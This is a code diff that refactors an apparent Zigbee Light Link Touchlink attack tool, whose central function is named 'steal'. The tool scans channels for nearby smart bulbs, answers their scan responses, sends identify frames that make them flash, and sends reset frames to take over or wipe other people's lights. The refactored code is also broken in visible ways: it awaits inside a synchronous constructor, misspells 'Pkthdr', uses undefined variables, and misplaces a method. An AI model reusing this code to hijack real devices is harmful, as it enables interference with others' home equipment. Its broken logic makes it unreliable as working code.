@@ -1,4 +1,5 @@
 import asyncio
+from dataclasses import dataclass
 import json
 import pure_pcapy
 import time
@@ -11,6 +12,8 @@ import bellows
 import bellows.cli.util as util
 import interpanZll
 
+
+DLT_IEEE802_15_4 = 195
 
 class Prompt:
     def __init__(self):
@@ -33,51 +36,41 @@ async def prepare_config(device_path, baudrate):
     util.check(res[0], "Unable to start mfglib")
     return (dev, eui64)
 
-async def steal(device_path, baudrate, scan_channel, reset_prompt=False, clean_up=True, config=None):
-    if config:
-        dev, eui64 = config
-    else:
-        dev, eui64 = await prepare_config(device_path, baudrate)
+def dump_pcap(pcap, frame):
+    ts = time.time()
+    ts_sec = int(ts)
+    ts_usec = int((ts - ts_sec) * 1_000_000)
+    hdr = pure_pcapy.Pkthdir(ts_sec, ts_usec, len(frame), len(frame))
+    pcap.dump(hdr, frame)
 
-    DLT_IEEE802_15_4 = 195
-    pcap = pure_pcapy.Dumper("log.pcap", 128, DLT_IEEE802_15_4)
-    #prompt = Prompt()
-    transactions_sent = []
-    transactions_received = []
-    valid_responses = []
-    invalid_responses = []
-
-    channel_list = [scan_channel] if scan_channel else list(range(11, 27)).reverse()
-    channel = None
-
-
-    def dump_pcap(frame):
-        ts = time.time()
-        ts_sec = int(ts)
-        ts_usec = int((ts - ts_sec) * 1000000)
-        hdr = pure_pcapy.Pkthdr(ts_sec, ts_usec, len(frame), len(frame))
-        pcap.dump(hdr, frame)
-
-
-    def handle_incoming(frame_name, response):
-        print("Got incoming data")
-        print(f"Frame name: {frame_name}")
+@dataclass
+class Target:
+    ext_address: str
+    transaction_id: int
+    signal_strength: int
+    channel: int
+    
+class ResponseHandler:
+    def __init__(self, pcap, channel, targets=None):
+        self.pcap = pcap
+        self.targets = targets if targets else set()
+        self.channel = channel
+ 
+    def handle_incoming(self, frame_name, response):
         #print(f"Response:\n{response}")
 
         if frame_name != "mfglibRxHandler":
             return
 
         data = response[2]
-        dump_pcap(data)
+        dump_pcap(self.pcap, data)
 
         if len(data)<10: # Not sure what this is, but not a proper response
-            print(f"Got some data, but given data len {len(data)} < 10, it's not a proper response")
             return
 
         try:
             resp = interpanZll.ScanResp.deserialize(data)[0]
         except ValueError:
-            print(f"Unable to deserialise: {response}")
             invalid_responses.append(response)
             return
 
@@ -86,13 +79,79 @@ async def steal(device_path, baudrate, scan_channel, reset_prompt=False, clean_u
         valid_responses.append(resp_dict)
 
         if resp.transactionId != transaction_id: # Not for us
-            print(f"{resp.transactionId} != {transaction_id}, this isn't a response to us.\nResponse:{resp}")
             return
 
-        targets.add((resp.extSrc, transaction_id, channel))
+        target = Target(resp.extSrc, transaction_id, resp.rssi, self.channel)
+        self.targets.add(target)
         frame = interpanZll.AckFrame(seq = resp.seq).serialize()
+        dump_pcap(self.pcap, frame)
+        asyncio.create_task(dev.mfglibSendPacket(frame))   
+
+class Touchlink:
+    def __init__(self, device_path, baud_rate):
+        self.device_path = device_path
+        self.baud_rate = baud_rate
+        self.dev, self.eui64 = await prepare_config(device_path, baud_rate)
+        self.pcap = pure_pcapy.Dumper("log.pcap", 128, DLT_IEEE802_15_4)
+
+    async def scan_channel(self, channel):
+
+        handler = ResponseHandler(self.pcap, channel, targets=None)
+        cbid = self.dev.add_callback(handler)
+        
+        print("Scanning on channel", channel)
+        res = await self.dev.mfglibSetChannel(channel)
+        util.check(res[0], "Unable to set channel")
+
+        transaction_id = randint(0, 0xFFFFFFFF)
+
+        # https://www.nxp.com/docs/en/user-guide/JN-UG-3091.pdf section 6.8.5
+        frame = interpanZll.ScanReq(
+            seq = 1,
+            srcPan = 0,
+            extSrc = self.eui64,
+            transactionId = transaction_id,
+        ).serialize()
+        dump_pcap(self.pcap, frame)
+        res = await dev.mfglibSendPacket(frame)
+        transactions_sent.append(transaction_id)
+        print(f"Sent packet: {res}")
+        util.check(res[0], "Unable to send packet")
+
+        await asyncio.sleep(1)
+        dev.remove_callback(cbid)
+        return handler.targets
+        
+
+    async def identify_bulb(dev, eui64, target, transaction_id, channel):
+        print(f"Sending flashing identifier packet to {target}")
+        res = await dev.mfglibSetChannel(channel)
+        util.check(res[0], "Unable to set channel")
+
+        frame = interpanZll.IdentifyReq(
+            seq = 2,
+            srcPan = 0,
+            extSrc = eui64,
+            transactionId = transaction_id,
+            extDst = target,
+            frameControl = 0xCC21,
+        ).serialize()
         dump_pcap(frame)
-        asyncio.create_task(dev.mfglibSendPacket(frame))
+        await dev.mfglibSendPacket(frame)
+
+async def steal(device_path, baudrate, scan_channel, reset_prompt=False, clean_up=True, config=None):
+    if config:
+        dev, eui64 = config
+    else:
+        dev, eui64 = await prepare_config(device_path, baudrate)
+    #prompt = Prompt()
+    transactions_sent = []
+    transactions_received = []
+    valid_responses = []
+    invalid_responses = []
+
+    channel_list = [scan_channel] if scan_channel else list(range(11, 27)).reverse()
+    channel = None
 
     cbid = dev.add_callback(handle_incoming)
 
@@ -150,22 +209,6 @@ async def steal(device_path, baudrate, scan_channel, reset_prompt=False, clean_u
 #             json.dump(invalid_responses, fp)
 #     except Exception as exc:
 #         print(f"Unable to write errors: {exc}")
-
-async def identify_bulb(dev, eui64, target, transaction_id, channel):
-    print(f"Sending flashing identifier packet to {target}")
-    res = await dev.mfglibSetChannel(channel)
-    util.check(res[0], "Unable to set channel")
-
-    frame = interpanZll.IdentifyReq(
-        seq = 2,
-        srcPan = 0,
-        extSrc = eui64,
-        transactionId = transaction_id,
-        extDst = target,
-        frameControl = 0xCC21,
-    ).serialize()
-    dump_pcap(frame)
-    await dev.mfglibSendPacket(frame)
 
 async def send_reset(dev, eui64, transaction_id, channel):
     res = await dev.mfglibSetChannel(channel)
